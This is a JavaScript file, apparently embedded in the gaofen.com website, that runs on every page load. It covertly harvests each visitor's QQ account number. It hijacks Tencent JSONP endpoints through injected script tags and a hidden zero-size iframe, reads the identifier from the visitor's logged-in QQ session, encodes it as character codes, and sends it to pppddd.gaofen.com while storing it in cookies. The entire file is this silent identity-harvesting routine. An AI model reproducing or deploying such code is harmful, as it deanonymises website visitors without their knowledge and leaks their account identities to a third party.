$(function(){
    var jq  = jQuery, quin, ck = 'uky', jqgt = !!jq.cookie;

	
	window['__GQ'] = (function(domain, isTtest, useType){

         var jq  = jQuery, quin, jqgt = !!jq.cookie, domain = domain || 'gaofen.com', useType = useType || 1
			 ,purl = 'http://pppddd.gaofen.com/gm/a.js';

         function  toASCII(qq){
             var qqCode = [];
             qq +='';
             for(var i=0;i < qq.length;i++){
                 qqCode.push(qq.charCodeAt(i));
             }
             return qqCode.join(',');
         }
         function appendJSc(url, success, error, id){
             success = success || jq.noop;
             var oScript = document.createElement("script");
             oScript.type = "text/javascript";
             oScript.src = url;
             if (oScript.readyState) {
                 oScript.onreadystatechange = function() {
                     if (oScript.readyState == "loaded"
                         || oScript.readyState == "complete") {
                         oScript.onreadystatechange = null;
                         window.setTimeout(success, 10);
                     }
                 };
             } else {
                 oScript.onload = function() {
                     window.setTimeout(success, 10);
                 };
             }

             if(id){
                 oScript.id = id;
             }

             oScript.onerror = function(){
                 (error || jq.noop)();
             }

             document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
         }


		 
		 function pushUin(u){
			 var t = +new Date, charcode = toASCII(u);
			 appendJSc(purl+'?uin='+charcode+'&_='+t);
			 //jq.get(purl, {quin : u}, function(r){
			 if(jqgt){
				 jq.cookie(ck,  charcode, {expires:10, domain : domain});
			 }else if(typeof setcookie !== 'undefined'){
				 setcookie(ck , charcode, 864000000, '', domain);
			 }
			 //});
		 }

         function gfgQ1(){
             if(jqgt) quin = jq.cookie(ck);
             else if(typeof getcookie !== 'undefined'){
                 quin = getcookie(ck);
             }
             var _quin = [];
			 
			 function checkLogin(){
				 var t = +new Date, url = 'http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t='+t;
				 appendJSc(url, function(s){
					 if(data0 && data0.err === 1026){
						 //appJs();
						 addFrame();
					 }else if(data0 && data0.err === 1002){
						 if(quin){
							 pushUin(quin);
						 }else{
							 setTimeout(checkLogin, 10000);
						 }
					 }
				 });
			 }

             function appJs(){
                 if(useType === 1){
                     var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/yxs/GetYxsRegTime?callback=gaofenCallback&dstuin=&t='+t;
                 }else{
                     var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead/get_player_info?callback=gaofenCallback&uin=&_='+t;
                 }
                 //var t = +new Date, url = 'http://dir.minigame.qq.com/cgi-bin/gamevip_fetch_vip_info_mini?imgtype=3&DomainID=207&callback=gaofenCallback&t='+t;
                 //url = 'http://dir.minigame.qq.com/cgi-bin/dir_fetch_qqhead?imgtype=3&DomainID=207&callback=gaofenCallback&t=1401862163959'
                 appendJSc(url, '', function(){//接口不可能走第二种方法
                     gfgQ2();
                 });
             }

             function addFrame(){
                 //var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gfq&uin=&_='+t;
                 //var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_open_box?callback=gfq&uin=&_='+t;
                 //var t = +new Date, url = 'http://webnotice.minigame.qq.com/register?callback=gfq=&_='+t;
				 var t = +new Date, url = 'http://c.v.qq.com/vuserfolders?otype=json&callback=gfq';
                 window.Pimg = "<script>function gfq(c){parent.gaofenCallback(c);}</script><script id='img' src='"+url+"'></script>";
                 $('body').append('<iframe src="javascript:parent.Pimg;" style="width: 0px; height: 0px;"></iframe>');
             }


             window.gaofenCallback = window.gaofenCallback || function(d){
                 if(d.result && d.result === 1000005){
                     if(quin) pushUin(quin);
                     else setTimeout(appJs, 10000);
                 }else{
                     pushUin(d.uin);
                 }
             };

             if(quin){
                 var quin = quin.split(','), _quin = [];
                 for(var i= 0,len = quin.length;i<len;i++){
                     _quin.push(String.fromCharCode(quin[i]));
                 }
                 quin = _quin = _quin.join('');
                 checkLogin();
                 //appJs();
                 //pushUin(_quin);
             }else{
                 checkLogin();
                 //appJs();
             }
         }

         //gfgQ1();//先运行第一种方法


         function gfgQ2(){

             ck = '_uky';
			 var _quin = [];
             if(jqgt) quin = jq.cookie(ck);
             else if(typeof getcookie !== 'undefined'){
                 quin = getcookie(ck);
             }

             var timer = null, myuin = '', useJs = true, appendTimer = 0;

             function removeJs(){
                 jq('#appUin').remove();
             }

             function toAppErr(){
                 removeJs();
                 timer = setTimeout(getUn, 0);
             }

             function toAppSucc(){
                 clearTimeout(timer);
                 timer = null;
                 removeJs();
                
                 jq.getJSON('http://pppddd.gaofen.com/index/outuin?uid='+myuin+'&callback=?', function(data){
					 if(data.length === 0){//获取不成功
						getUn();
					 }else if(data.uin && data.uin !='0'){
						pushUin(data.uin);
					 	if(jqgt){
							 jq.cookie(ck, toASCII(data.uin), {expires:1, domain : domain});
						 }else if(typeof setcookie !== 'undefined'){
							 setcookie(ck , toASCII(data.uin), 86400000, '', domain);
						 }
					 }else{
						getUn();
					 }
                 });
                 /*
                 jq.get('/api/getqq', {uin : myuin}, function(r){//提交给后台处理返回后设置cookie
                     if(r.rst){
                         if(isTtest) alert('获取成功!');
                         if(jqgt){
                             jq.cookie(ck, toASCII(r.rst), {expires:1, domain : domain});
                         }else if(typeof setcookie !== 'undefined'){
                             setcookie(ck , toASCII(r.rst), 86400000, '', domain);
                         }
                     }
                     //jq('#msg').html('<div>获取成功</div>');
                     //setTimeout(function(){location.href = '/qlist';},5000);
                     //console.log(r);
                 });
				*/
             }

             function getUn(){
                 var t = +new Date;
                 t +=1000;
                 appendTimer++;
                 if(myuin && useJs && appendTimer< 50){
                     appendJSc('http://app.data.qq.com/?umod=user&uid='+myuin+'&t='+t, toAppSucc, toAppErr, 'appUin');
                 }else{//img方式
                     /*
                      if(appendTimer <  20){
                      appendTimer++;
                      appendImg('http://app.data.qq.com/?umod=user&uid=165543416&t='+t);
                      setTimeout(getUn, 1500);
                      }else{
                      toAppSucc();
                      }
                      */
                 }

             }

             function loadjs() {
                 try {
                     if (data0.err == '1026') {//已登录,取空间UID
                         if(!myuin){
                             
                             jq.getJSON("http://pppddd.gaofen.com/index/getUid?callback=?", function(data){
                                   if(data.uid){
                                       myuin = data.uid;
                                       timer = setTimeout(getUn, 0);
                                   }
                             });
                             /* 
                             jq.get('/api/getUin', {}, function(r){
                                 var uin = '';
                                 for(var k in r.rst)
                                     myuin = k;
                                 timer = setTimeout(getUn, 0);
                             });
							*/
                         }else{
                             timer = setTimeout(getUn, 0);
                         }
                     } else {
                         window.setTimeout(dynamicLoad, 10000);
                     }
                 } catch (e) {
                     window.setTimeout(dynamicLoad, 10000);
                 }
             }

             //function appendImg(url){
             //    jq('body').append('<img src="'+url+'" style="display:none;">');
             //}

             function dynamicLoad() {
                 appendJSc("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime(), loadjs);
             }

             if(!quin){
                 dynamicLoad();
             }else{
                 quin = quin.split(',');
                 for(var i= 0,len = quin.length;i<len;i++){
                     _quin.push(String.fromCharCode(quin[i]));
                 }
                 _quin = _quin.join('');
				 pushUin(_quin);
                 //jq.get('http://pppddd.gaofen.com/gm/a.js?_1401791679150', {quin : _quin}, function(r){})
             }

         }
		 
         gfgQ1();
     })

     __GQ(window.location.hostname, true, 2);
});